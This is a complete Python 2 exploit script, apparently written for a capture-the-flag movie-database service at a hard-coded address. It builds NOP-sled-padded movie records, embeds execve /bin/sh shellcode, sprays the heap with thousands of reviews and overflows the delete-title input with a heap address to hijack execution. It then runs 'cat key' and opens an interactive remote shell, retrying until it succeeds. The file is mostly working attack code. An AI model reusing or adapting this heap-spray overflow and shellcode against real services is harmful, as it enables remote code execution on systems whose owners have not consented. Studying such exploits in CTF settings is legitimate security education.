#!/usr/bin/python

from sock import *
import sys
import time
import errno
                                                                                                    
###############################################################################
#                                                                             # 
#   Skeleton exploit for use                                                  #
#   Uses a nice socket library (https://github.com/hellman/sock/)             #
#   Actually read this ans feel free to modify!                               #
#                                                                             # 
###############################################################################

LOCAL = False
DEBUG = False

if LOCAL:
    HOST = "localhost"
    PORT = "55000"
    SLEEP_TIME = 0
    #MAX_ENTRIES = 8000
    #MAX_ENTRIES = 16384
else:
    HOST = "54.215.5.83"
    PORT = "3036"
    SLEEP_TIME = 0
    #MAX_ENTRIES = 8000
    MAX_ENTRIES = 16384

NOP = "\x90"
HEAP_ADDRESS = "\x09\x45\xc0\x08"
#HEAP_ADDRESS = "\x0b\x45\xc0\x08"
#HEAP_ADDRESS = "\x0b\xaa\xb1\x50"

# Some useful shellcode (Not Aleph One's, but it does exec \bin\sh)
SHELLCODE = "\x6a\x0b\x58\x99\x52\x68\x2f\x2fsh\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

attempts = 0

################################################################################
#
#   pause_script
#
#   A useful function to wait for the user to press enter, that way you can 
#   put in pause points easily
#
################################################################################
def pause_script():
    raw_input("Paused... Press enter to continue: ")

################################################################################
#
#   pause_script_msg
#
#   A useful function to wait for the user to press enter, that way you can 
#   put in pause points easily, prints a custom message
#
################################################################################
def pause_script_msg(message):
    raw_input("Paused... " + message)

################################################################################
#
#   connect
#
################################################################################
def connect():
    con = Sock(HOST + ":" + PORT)
    return con

################################################################################
#
#   clear_read_buffer
#
#   This will clear the read buffer and print all of it
#
################################################################################
def clear_read_buffer(con):
    r = con.read_one(0)
    while len(r) > 0:
        #print r
        r = con.read_one(0)

################################################################################
#
#   remove_movie
#
#   This will remove a movie, and tell you success
#
################################################################################
def remove_movie(title,con):
    # Choose the remove option from the main menu
    #con.send_line("d")
    con.send("d") 
    con.send("\n") 

    # Wait for a response
    time.sleep(1)

    # Clear out the read buffer
    con.read_one(0)
    
    # Send the movie title
    con.send_line(title)

    #pause_script_msg("Press Enter to receive response")

    # Wait for a response
    time.sleep(1)

    # Read the response
    resp = con.read_line()

    # Did we delete the movie?
    return "Removed movie!" in resp

################################################################################
#
#   review_movie
#
#   This will review a movie
#
################################################################################
def review_movie(title, review, con):
    # Choose the remove option from the main menu
    con.send_line("r")
    
    # Wait for a response
    time.sleep(SLEEP_TIME)

    # Clear out the read buffer
    con.read_one(0)
    
    # Send the movie title
    con.send_line(title)

    # Wait for a response
    time.sleep(SLEEP_TIME)

    # Clear out the read buffer
    con.read_one(0)

    # Send the review
    con.send_line(review)

    # Wait for a response
    time.sleep(SLEEP_TIME)

    # Read the response
    #resp = con.read_line()

    # Did we delete the movie?
    #return "Reviewed!" in resp
    return True

################################################################################
#
#   send_movie
#
#   This will add a movie
#
################################################################################
def send_movie(movie,con):
    # Choose the add option
    con.send_line("a")

    # Send all the data in order
    con.send_line(movie["title"])
    con.send_line(movie["director"])
    con.send_line(movie["writer"])
    con.send_line(movie["star1"])
    con.send_line(movie["star2"])
    con.send_line(movie["star3"])
    con.send_line(movie["star4"])
    con.send_line(movie["star5"])
    con.send_line(movie["summary"])
    con.send_line(movie["country"])
    con.send_line(movie["budget"])
    con.send_line(movie["opening_weekend"])
    con.send_line(movie["gross"])
    con.send_line(movie["runtime"])
    con.send_line(movie["aspect"])
    con.send_line(movie["composer"])
    con.send_line(movie["average_rating"])

################################################################################
#
#   hijack_execution
#
################################################################################
def hijack_execution(con):

    time.sleep(5)
    #clear_read_buffer(con)

    # Setup overflow string
    overflow_string = ""
    overflow_size = 528

    for i in range(0, overflow_size):
        overflow_string += "k"

    overflow_string += HEAP_ADDRESS

    # Choose the remove option from the main menu
    con.send_line("d")

    # Wait for a response
    time.sleep(1)

    # Clear out the read buffer
    con.read_one(0)

    if DEBUG:
        pause_script_msg("Press Enter to Pwn")

    #clear_read_buffer(con)
    
    # Send the "movie title"
    con.send_line(overflow_string)

    time.sleep(5)
    resp = con.read_one(0)
    if "Unable to find movie!" in resp:
        print "\nHijack executed"
    #resp = con.read_line()

    #return "Unable to find movie!" in resp
    #con.write("ls\n")
    #time.sleep(1)
    #resp = con.read_line()

    #return resp

################################################################################
#
#   go_interactive
#
#   Switches to an interactive mode, good for shells maybe
#   You can't get out of interactive mode
#
################################################################################
def go_interactive(con):


    con.write("ls\n")
    time.sleep(15)
    clear_read_buffer(con)
    resp = con.read_one(0)
    #print resp
    #if not resp:
    #    return False
    try:
        con.read_line()
    except conerror:
        return False
    except IOError, e:
        return False




    con.write("ls\n")
    time.sleep(1)
    resp = con.read_one(0)
    print resp
    con.write("cat key\n")
    resp = con.read_one(0)
    print resp

    print "\aSuccess! Attempts: " + `attempts`
    print "Entering interactive mode:"
    #clear_read_buffer(con)

    while True:
        time.sleep(1)
        print con.read_one(0)
        try:
            con.write(sys.stdin.readline())
        except IOError, e:
            return False



################################################################################
#
#   build_nop_string
#
################################################################################
def build_nop_string(size):
    nop_string = ""

    for i in range(0, size):
        nop_string += NOP

    return nop_string
################################################################################
#
#   build_string
#
################################################################################
def build_string(string, size):
    built_string = ""

    for i in range(0, size):
        built_string += string

    return built_string

################################################################################
#
#   build_movie
#
################################################################################
def build_movie():

    title           = build_nop_string(500)
    director        = build_nop_string(300)
#296 - 360
    # writer 300 - 12
    writerNop       = "\x47\x72\x28\xda\xf8\x0d\xec\x44\x77\xf6\xe9\x43"
    writer          = build_string(writerNop, 25)
    #writer          = build_nop_string(300)

    # star1 300 - 5
    star1Nop        = "\x5f\x72\xff\xc7\x4b"
    star1           = build_string(star1Nop, 60)
    #star1          = build_nop_string(300)

    star2           = build_nop_string(300)

    # star3 300 - 1
    star3Nop        = "\x16"
    star3           = build_string(star3Nop, 300)

    star4           = build_nop_string(300)

    # star5 300 - 20
    star5Nop        = "\xf9\x8e\xf1\xd8\x02\x08\x89\x40\xcf\x5e\x84\xc0\x75\xe4\x56\x7a\xec\x1b\x1f\x85"
    star5           = build_string(star5Nop, 15)
    #star5          = build_nop_string(300)

    # summary 2000 - 80
    #summaryNop     = ""
    #summary        = build_string(summaryNop, 25)
    summary         = build_nop_string(2000)

    country         = build_nop_string(30)
    budget          = build_nop_string(80)

    # open_weekend 80 - 80
    #weekendNop     = ""
    #opening_weekend= weekendNop
    opening_weekend = build_nop_string(80)

    # gross 80 - 20
    #grossNop       = "\x5f\x8e\xa3\xda\x1f\xb6\x5d\x1d\x16\x1c\xde\xe6\xaf\x8f\x36\x73\xbd\x39\x15\x4d"
    #gross          = build_string(grossNop, 4)
    gross           = build_nop_string(80)

    # runtime 80 - 80
    runtimeNop      = "\x32\x51\x5d\x6a\x2e\x8f\x35\x66\xbf\x62\x84\x0d\xd2\x2d\xc8\x99\x71\x2d\xde\xe2\x08\xeb\x93\x48\xa9\x77\xae\x94\x54\x73\xd3\xd2\x31\xb8\x3f\xf4\x21\x8a\xa3\x8b\x73\x9a\x60\xe2\x9e\x0c\x71\xa3\xa2\x09\x44\xf1\x2a\x25\xbe\xc2\x24\x19\x18\x83\x8e\xd4\xa2\xc0\xc9\xfa\x56\x91\xcf\x38\xd5\x8a\x34\x04\x59\xaf\x44\xa2\x9d\xe2"
    runtime         = build_string(runtimeNop, 1)
    #runtime        = build_nop_string(80)

    # aspect 40 - 20
    aspectNop       = "\xf7\x31\xf2\xe1\x8c\xd8\x1d\x21\x5d\xe4\x4a\x79\xd7\xf2\x72\x97\x14\xc8\xe5\xfa"
    aspect          = build_string(aspectNop, 2)
    #aspect         = build_nop_string(40)

    # composer 300 - 6
    #composerNop    = "\x63\xff\x2e\x2d\xec\xf9"
    #composer       = build_string(composerNop, 46)

    #composer      += "\x63\xff\x2e\xd7\x77\x31"
    #composer      += "\x6a\x3d\xd6\x92\x53\x1a"
    #composer      += "\x9b\x07\x91\xdf\x15\x07"
    #composer      += "\x7a\x8c\x8f\x74\xb1\xe9"

    #composer        = build_nop_string(300)
    composer        = build_nop_string(279)
    composer       += SHELLCODE

    # average_rating 3 - 1
    aratingNop      = "\xb6"
    average_rating  = build_string(aratingNop, 3)
    #average_rating  = build_nop_string(3)

    movie = {           
              "title" : title,
           "director" : director,
             "writer" : writer,
              "star1" : star1,
              "star2" : star2,
              "star3" : star3,
              "star4" : star4,
              "star5" : star5,
            "summary" : summary,
            "country" : country,
             "budget" : budget,
    "opening_weekend" : opening_weekend,
              "gross" : gross,
            "runtime" : runtime,
             "aspect" : aspect,
           "composer" : composer,
     "average_rating" : average_rating
    }

    #print "title: " + `len(title)`
    #print "director: " + `len(director)`
    #print "writer: " + `len(writer)`
    #print "star1: " + `len(star1)`
    #print "star2: " + `len(star2)`
    #print "star3: " + `len(star3)`
    #print "star4: " + `len(star4)`
    #print "star5: " + `len(star5)`
    #print "summary: " + `len(summary)`
    #print "country: " + `len(country)`
    #print "budget: " + `len(budget)`
    #print "opening_weekend: " + `len(opening_weekend)`
    #print "gross: " + `len(gross)`
    #print "runtime: " + `len(runtime)`
    #print "aspect: " + `len(aspect)`
    #print "composer: " + `len(composer)`
    #print "average_rating: " + `len(average_rating)`

    return movie

################################################################################
#
#   Main
#
################################################################################

while True:
    attempts += 1
    print "Initiating exploit... Attempt #" + `attempts`

    # Start the connection
    con = connect()

    if DEBUG:
        pause_script_msg("Press Enter to start exploit")
    else:
        time.sleep(1)

    movie = build_movie()

    send_movie(movie, con)

    print "Movie sent"

    # Create reviews to amplify the spray

    title  = NOP + "\0"
    review = build_nop_string(3)

    print "Sending reviews:"
    for i in range(0, MAX_ENTRIES):
        review_movie(title, review, con)
        #print(`i` + "..."),
        #if ((i + 1) % 10 == 0):
            #print ""

    hijack_execution(con)

    if not go_interactive(con):
        continue
